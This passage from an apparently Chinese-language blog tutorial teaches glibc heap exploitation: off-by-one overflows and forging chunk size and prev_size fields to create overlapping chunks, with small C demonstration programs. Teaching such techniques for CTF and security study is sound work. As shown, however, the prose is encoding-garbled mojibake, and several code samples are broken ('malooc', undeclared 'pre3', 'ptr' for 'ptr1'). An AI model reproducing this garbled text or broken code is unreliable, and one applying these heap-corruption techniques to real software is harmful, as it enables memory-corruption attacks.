class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚ä¸Šï¼Œæˆ‘ä»¬è‡ªå·±å†™çš„ my_gets å‡½æ•°å®é™…è¾“å…¥ size+1 ä½æ•°æ®ï¼Œé€ æˆäº† off-by-one æº¢å‡ºã€‚</p><p>æˆ‘ä»¬ä½¿ç”¨ gdb å¯¹ç¨‹åºè¿›è¡Œè°ƒè¯•ï¼ŒæŸ¥çœ‹åœ¨è¿›è¡Œè¾“å…¥åˆ†é…çš„å †å—ä¸ºä¸¤ä¸ªåå…­å­—èŠ‚çš„å †å—ï¼š</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/chunk_heap.png"></p><p>è¿ç»­è¾“å…¥17ä¸ª1ï¼Œä¼šå‘ç°è¦†ç›–åˆ°äº†ä¸‹ä¸€ä¸ª chunk çš„ <em>prev_size</em> å­—èŠ‚ã€‚</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/chunk_heapflow.png"></p><p>æ —å­2ï¼š</p><p>å¯¼è‡´ off-by-one çš„åœºæ™¯å°±æ˜¯å­—ç¬¦ä¸²æ“ä½œäº†ï¼Œå¸¸è§çš„åŸå› æ˜¯å­—ç¬¦ä¸²çš„ç»“æŸç¬¦è®¡ç®—æœ‰è¯¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">40</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-type">void</span> *chunk1;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get Input&quot;</span>);<br>    gets(buffer);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(buffer)==<span class="hljs-number">24</span>)<br>    &#123;<br>        <span class="hljs-built_in">strcpy</span>(chunk1,buffer);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>           <br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç¨‹åºä¹ä¸€çœ‹æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦æ³¨æ„åˆ°çš„æ˜¯ï¼Œstrlen çš„é•¿åº¦è®¡ç®—æ–¹æ³•å’Œ strcpy å¤åˆ¶æ—¶çš„é•¿åº¦æ˜¯ä¸ä¸€æ ·çš„ã€‚strlen è®¡ç®—ASCII å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå®ƒåœ¨è®¡ç®—é•¿åº¦æ—¶æ˜¯ä¸ä¼šæŠŠå­—ç¬¦ä¸²ç»“å°¾çš„ â€˜\x00â€™ è®¡ç®—åœ¨å†…çš„ï¼Œä½†æ˜¯ strcpy åœ¨å¤åˆ¶å­—ç¬¦ä¸²çš„æ—¶å€™ä¼šæ‹·è´å­—ç¬¦ä¸²çš„ç»“æŸç¬¦ â€˜\x00â€™ ã€‚è¿™å°±å¯¼è‡´æˆ‘ä»¬å®é™…ä¸Šæ˜¯å‘chunk1 ä¸­å†™å…¥äº†25å­—èŠ‚ã€‚</p><p>åœ¨strcpyå‘½ä»¤æ‰§è¡Œä¹‹å‰æˆ‘ä»¬çš„å †ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x804b158</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x804b168</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x804b178</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000411</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œåå°±ä¼šå‘ç°å®ƒè¦†ç›–äº†ä¸‹ä¸€ä¸ªå †å—çš„ä½å­—èŠ‚ï¼ˆå°ç«¯åºï¼‰ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x804b158</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><span class="hljs-number">0</span>x4<span class="hljs-number">141414141414141</span><br><span class="hljs-number">0x804b168</span>:<span class="hljs-number">0</span>x4<span class="hljs-number">141414141414141</span><span class="hljs-number">0</span>x4<span class="hljs-number">141414141414141</span><br><span class="hljs-number">0x804b178</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000400</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>ï¼ˆä¸ºä»€ä¹ˆæ²¡æœ‰æˆªå›¾ï¼Œå› ä¸ºè¿™ç©æ„æˆ‘éƒ½å¤ç°ä¸æˆåŠŸğŸ˜…ï¼‰</p><blockquote><p>è¿™ä¸ªæ¼æ´åœ¨2.29ä¹‹åå°±ä¸èƒ½åˆ©ç”¨äº†ï¼Œå› ä¸ºglibcæ›´æ–°ä»¥åå¢åŠ äº†æ£€æŸ¥çš„ä»£ç ã€‚</p></blockquote><h1 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h1><p>è¿™ç§æ”»å‡»ç›®çš„åœ¨äºå°†ä¸€ä¸ªchunkå—çš„å¯æ§åŒºåŸŸè¡ç”Ÿåˆ°ä¸å…¶ç›¸é‚»çš„ä¸€ä¸ªæˆ–è€…å¤šä¸ªchunkå—ä¸­ã€‚é€šè¿‡è¿™ç§æ”»å‡»æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹åˆ°ä¸å±äºæœ¬chunkå—çš„å†…å®¹ã€‚é€šè¿‡ extend å¯ä»¥å®ç° chunk overlapping çš„æ•ˆæœã€‚</p><p>ä¸€èˆ¬æ¥è¯´è¿™ç§æŠ€æœ¯å¹¶ä¸èƒ½ç›´æ¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ï¼Œä½†æ˜¯å¯ä»¥æ§åˆ¶chunk ä¸­çš„å†…å®¹ã€‚å¦‚æœchunk ä¸­å­˜åœ¨å­—ç¬¦ä¸²æŒ‡é’ˆã€å‡½æ•°æŒ‡é’ˆç­‰ï¼Œå°±å¯ä»¥åˆ©ç”¨è¿™äº›æŒ‡é’ˆæ¥è¿›ä¸€æ­¥è¿›è¡Œä¿¡æ¯æ³„éœ²å’Œç¨‹åºæ‰§è¡Œæµç¨‹ã€‚</p><h3 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>chunk extend æŠ€æœ¯èƒ½å¤Ÿäº§ç”Ÿçš„åŸå› åœ¨äº ptmalloc åœ¨å¯¹å † chunk è¿›è¡Œæ“ä½œæ—¶ä½¿ç”¨çš„å„ç§å®ã€‚</p><ul><li><p>è·å–å½“å‰ chunk å—å¤§å°çš„æ“ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* ä»…ç”¨æˆ·ç©ºé—´éƒ¨åˆ†çš„å¤§å° */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span><br><span class="hljs-comment">//SIZE_BITS åœ¨è¿™é‡Œæ˜¯ä¸€ä¸ªä»£è¡¨å †å—å¤§å°çš„æ ‡å¿—ä½æ©ç </span><br><br><span class="hljs-comment">/* å®Œæ•´å †å—çš„å¤§å° */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span><br></code></pre></td></tr></table></figure></li><li><p>è·å–ä¸‹ä¸€ä¸ª chunk å—åœ°å€çš„æ“ä½œï¼Œå³ä½¿ç”¨å½“å‰å—æŒ‡é’ˆåŠ ä¸Šå½“å‰å—å¤§å°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span><br></code></pre></td></tr></table></figure></li><li><p>è·å–å‰ä¸€ä¸ª chunk å—ä¿¡æ¯çš„æ“ä½œï¼Œå…¶ä¸­å †å—åœ°å€çš„è®¡ç®—æ˜¯ç”±å½“å‰ chunk åœ°å€å‡å»å‰ä¸€ä¸ª chunk çš„å¤§å°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* å‰ä¸€ä¸ªå †å—çš„å¤§å° */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><br><span class="hljs-comment">/* å‰ä¸€ä¸ªå †å—çš„åœ°å€  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span><br></code></pre></td></tr></table></figure></li><li><p>åˆ¤æ–­å½“å‰å †å—æ˜¯å¦è¢«ä½¿ç”¨ï¼Œå³æŸ¥çœ‹ä¸‹ä¸€ chunk çš„ prev_inuse åŸŸï¼Œè€Œä¸‹ä¸€å—åœ°å€åˆå¦‚æˆ‘ä»¬å‰é¢æ‰€è¿°æ˜¯æ ¹æ®å½“å‰ chunk çš„ size è®¡ç®—å¾—å‡ºçš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> inuse(p)</span><br>    ((((mchunkptr)(((<span class="hljs-type">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)<br></code></pre></td></tr></table></figure></li></ul><p>é€šè¿‡ä¸Šé¢çš„å‡ ä¸ªå®æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œ ptmalloc é€šè¿‡ chunk header çš„æ•°æ®æ¥åˆ¤æ–­ chunk çš„ä½¿ç”¨æƒ…å†µå’Œå¯¹ chunk å‰åè¿›è¡Œå®šä½ã€‚</p><p>è€Œæˆ‘ä»¬çš„ chunk extend å°±æ˜¯é€šè¿‡æ§åˆ¶ chunk header å³ size å’Œ pre_size åŸŸæ¥å®ç°è·¨è¶Šå—æ“ä½œå¯¼è‡´ overlappingã€‚</p><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><h5 id="ğŸŒ°1ï¼šå¯¹-inuse-çš„-fastbin-è¿›è¡Œ-extend"><a href="#ğŸŒ°1ï¼šå¯¹-inuse-çš„-fastbin-è¿›è¡Œ-extend" class="headerlink" title="ğŸŒ°1ï¼šå¯¹ inuse çš„ fastbin è¿›è¡Œ extend"></a>ğŸŒ°1ï¼šå¯¹ inuse çš„ fastbin è¿›è¡Œ extend</h5><p>å°±æ˜¯é€šè¿‡æ›´æ”¹ç¬¬ä¸€ä¸ªå †å—çš„ä¿¡æ¯æ¥æ§åˆ¶å®ƒä¹‹åçš„å †å—çš„å†…å®¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3;<br>    ptr1 = malooc(<span class="hljs-number">0x10</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr1<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x41</span>;  <span class="hljs-comment">// ä¿®æ”¹ç¬¬ä¸€ä¸ªå—çš„sizeåŸŸ</span><br>    <br>    <span class="hljs-built_in">free</span>(ptr1);<br>    pre3 = malooc(<span class="hljs-number">0x30</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸¤æ¬¡ malloc åå †å—ä¸­çš„æ•°æ®æ˜¯è¿™æ ·çš„</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extend-gdb1.png"></p><p>ä¿®æ”¹äº† ptr1 çš„ size ä½åå¯¹åº”å˜æˆäº† 41</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extend-gdb2.png"></p><p>æˆ‘ä»¬ free æ‰å®ƒä¹‹åï¼Œ ä¹Ÿå¯¹åº”è¿›å…¥äº† 0x40 çš„ bin ä¸­</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extend-gdb3.png"></p><p>æ­¤æ—¶æˆ‘ä»¬å†æ¬¡åˆ†é… 0x30 çš„å †å—å°±ä¼šæŠŠåŸæœ¬å±äº ptr2 å¤´éƒ¨çš„å†…å­˜åˆ†é…åˆ° ptr3 ä¸­ï¼Œ</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extend-gdb4.png"></p><p>æ­¤æ—¶åŸæœ¬ chunk2 çš„å¤´éƒ¨æ˜¯ç°åœ¨ ptr3 çš„ç”¨æˆ·å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ§åˆ¶å…¶å†…å®¹ï¼Œè¿™ç§çŠ¶æ€å°±å«åš overlapping chunkã€‚</p><h5 id="ğŸŒ°2ï¼šå¯¹-inuse-çš„-unsortedbin-è¿›è¡Œ-extend"><a href="#ğŸŒ°2ï¼šå¯¹-inuse-çš„-unsortedbin-è¿›è¡Œ-extend" class="headerlink" title="ğŸŒ°2ï¼šå¯¹ inuse çš„ unsortedbin è¿›è¡Œ extend"></a>ğŸŒ°2ï¼šå¯¹ inuse çš„ unsortedbin è¿›è¡Œ extend</h5><p>æˆ‘ä»¬çŸ¥é“å¤„äº fastbin èŒƒå›´çš„ chunk é‡Šæ”¾åä¼šè¢«ç½®å…¥ fastbin é“¾è¡¨ä¸­ï¼Œè€Œä¸å¤„äºè¿™ä¸ªèŒƒå›´çš„ chunk è¢«é‡Šæ”¾åä¼šè¢«ç½®äº unsorted bin é“¾è¡¨ä¸­ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±ä½¿ç”¨ 0x80 æ¥åˆ†é…å †ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3;<br>    ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);      <span class="hljs-comment">//é˜²æ­¢ä¸top chunkåˆå¹¶</span><br>    <br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr1<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;<br>    <span class="hljs-built_in">free</span>(ptr1);<br>    ptr3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå› ä¸ºåˆ†é…çš„ size ä¸å¤„äº fastbin çš„èŒƒå›´ï¼Œå› æ­¤åœ¨é‡Šæ”¾æ—¶å¦‚æœä¸ top chunk ç›¸è¿ä¼šå¯¼è‡´å’Œ top chunk åˆå¹¶ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦é¢å¤–åˆ†é…ä¸€ä¸ª chunkï¼ŒæŠŠé‡Šæ”¾çš„å—ä¸ top chunk éš”å¼€ã€‚</p></blockquote><p>ä¸‰æ¬¡ malloc åˆ†é…å®Œä»¥åï¼Œå†…å­˜ä¸­çš„æ•°æ®å¦‚ä¸‹ï¼š</p><p><img src="D:/ç¬”è®°/PWN/å †/ç²¾ç¾é…å›¾/unsortedextend-gdb1.png"></p><p>ä¿®æ”¹size æ•°æ®åptr1 å’Œ ptr2 åˆå¹¶ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="D:/ç¬”è®°/PWN/å †/ç²¾ç¾é…å›¾/unsortedextend-gdb2.png"></p><p>ç›¸åº”çš„ free åè¿›å…¥äº† unsorted bin</p><p><img src="D:/ç¬”è®°/PWN/å †/ç²¾ç¾é…å›¾/unsortedextend-gdb3.png"></p><p>å†æ¬¡åˆ†é…æˆ‘ä»¬å°±è¾¾åˆ°äº†overlapping chunkçš„ç›®çš„ã€‚</p><h5 id="ğŸŒ°3ï¼šå¯¹-free-çš„-unsortedbin-è¿›è¡Œ-extend"><a href="#ğŸŒ°3ï¼šå¯¹-free-çš„-unsortedbin-è¿›è¡Œ-extend" class="headerlink" title="ğŸŒ°3ï¼šå¯¹ free çš„ unsortedbin è¿›è¡Œ extend"></a>ğŸŒ°3ï¼šå¯¹ free çš„ unsortedbin è¿›è¡Œ extend</h5><blockquote><p>åœ¨ä¾‹äºŒçš„åŸºç¡€ä¸Šè¿›è¡Œï¼Œå…ˆé‡Šæ”¾ chunk ï¼Œå†ä¿®æ”¹</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3;<br>    ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);      <span class="hljs-comment">//é˜²æ­¢ä¸top chunkåˆå¹¶</span><br>    <br>    <span class="hljs-built_in">free</span>(ptr1);<br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr1<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;<br>    ptr3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸‰æ¬¡ malloc ä¹‹åçš„ç»“æœå¦‚ä¸‹</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/freesortedextend-gdb1.png"></p><p>é‡Šæ”¾ ptr1 åï¼Œchunk è¿›å…¥ unsortedbin</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/freesortedextend-gdb2.png"></p><p>ä¿®æ”¹ size å­—æ®µ</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/freesortedextend-gdb3.png"></p><p>å†æ¬¡åˆ†é…ï¼Œptr2 å¤´éƒ¨è¢«åˆ†é…è¿›æ–°çš„å †å—ï¼Œæˆ‘ä»¬å°±è¿™æ ·æ§åˆ¶äº† ptr2 çš„å†…å®¹</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/freesortedextend-gdb4.png"></p><h5 id="ğŸŒ°4ï¼šé€šè¿‡-extend-å‘å-overlapping"><a href="#ğŸŒ°4ï¼šé€šè¿‡-extend-å‘å-overlapping" class="headerlink" title="ğŸŒ°4ï¼šé€šè¿‡ extend å‘å overlapping"></a>ğŸŒ°4ï¼šé€šè¿‡ extend å‘å overlapping</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr1,*ptr2;<br><br>    ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x61</span>;<br>    <span class="hljs-built_in">free</span>(ptr1);<br>    <span class="hljs-built_in">free</span>(ptr2);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x50</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ malloc(0x50) å¯¹ extend åŒºåŸŸé‡æ–°å ä½åï¼Œå…¶ä¸­ 0x10 çš„ fastbin å—ä¾ç„¶å¯ä»¥æ­£å¸¸çš„åˆ†é…å’Œé‡Šæ”¾ï¼Œæ­¤æ—¶å·²ç»æ„æˆ overlappingï¼Œé€šè¿‡å¯¹ overlapping çš„è¿›è¡Œæ“ä½œå¯ä»¥å®ç° fastbin attackã€‚</p><p>å°±åƒä¸Šé¢çš„ä¾‹å­ï¼Œæˆ‘ä»¬åœ¨ä¸¤æ¬¡freeåå¯ä»¥å‘ç°bin ä¸­å‡ºç°äº†overlappingã€‚</p><p>ç¬¬ä¸€è½®çš„ malloc ç»“æŸ</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb1.png"></p><p>ä¿®æ”¹ ptr1 çš„ size</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb2.png"></p><p>ä¸¤æ¬¡ freeï¼Œbin ä¸­å‡ºç°äº†overlappingã€‚</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb3.png"></p><p>è€Œæ¥ä¸‹æ¥çš„ä¸¤æ¬¡ malloc ï¼Œâ€œ ä¸¤å— â€ chunk ä¹Ÿè¢«ä¸€æ¬¡åˆ†é…äº†</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb4.png"></p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb5.png"></p><h5 id="ğŸŒ°5ï¼šé€šè¿‡-extend-å‘å‰-overlapping"><a href="#ğŸŒ°5ï¼šé€šè¿‡-extend-å‘å‰-overlapping" class="headerlink" title="ğŸŒ°5ï¼šé€šè¿‡ extend å‘å‰ overlapping"></a>ğŸŒ°5ï¼šé€šè¿‡ extend å‘å‰ overlapping</h5><p>å‰å‘ extend åˆ©ç”¨äº† smallbin çš„ unlink æœºåˆ¶ï¼Œé€šè¿‡ä¿®æ”¹ pre_size åŸŸå¯ä»¥è·¨è¶Šå¤šä¸ª chunk è¿›è¡Œåˆå¹¶å®ç° overlappingã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3,*ptr4;<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);      <span class="hljs-comment">//smallbin1</span><br>    ptr2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);    <span class="hljs-comment">//fastbin1</span><br>    ptr3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);    <span class="hljs-comment">//fastbin2</span><br>    ptr4=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);     <span class="hljs-comment">//smallbin2</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);    <span class="hljs-comment">//é˜²æ­¢ä¸topåˆå¹¶</span><br>    <span class="hljs-built_in">free</span>(ptr1);<br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr4<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x90</span>;  <span class="hljs-comment">//ä¿®æ”¹pre_inuseåŸŸ</span><br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr4<span class="hljs-number">-0x10</span>)=<span class="hljs-number">0xd0</span>;  <span class="hljs-comment">//ä¿®æ”¹pre_sizeåŸŸ</span><br>    <span class="hljs-built_in">free</span>(ptr4);  <span class="hljs-comment">//unlinkè¿›è¡Œå‰å‘extend</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x150</span>);  